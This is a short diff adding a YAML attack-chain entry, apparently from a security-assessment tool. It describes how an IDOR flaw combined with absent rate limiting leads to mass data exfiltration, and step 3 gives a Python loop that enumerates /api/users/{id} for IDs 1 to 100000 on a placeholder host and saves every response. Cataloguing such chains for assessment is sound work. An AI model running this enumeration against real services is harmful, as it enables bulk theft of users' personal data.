@@ -1,0 +1,23 @@
+id: idor_to_data_breach
+name: IDOR + No Rate Limit = Mass Data Exfiltration
+impact: critical
+prerequisites:
+  - idor on user data endpoint
+  - no rate limiting on the endpoint
+chain:
+  - step: 1
+    finding: idor
+    description: "Find IDOR on /api/users/{id} or similar"
+  - step: 2
+    finding: no_rate_limit
+    description: "Confirm endpoint has no rate limiting"
+  - step: 3
+    action: "Enumerate all user IDs sequentially"
+    script: |
+      for i in range(1, 100000):
+          resp = requests.get(f"https://target.com/api/users/{i}")
+          if resp.status_code == 200:
+              save(resp.json())
+  - step: 4
+    result: "Mass exfiltration of all user data"
+    impact: "Data breach affecting all users"
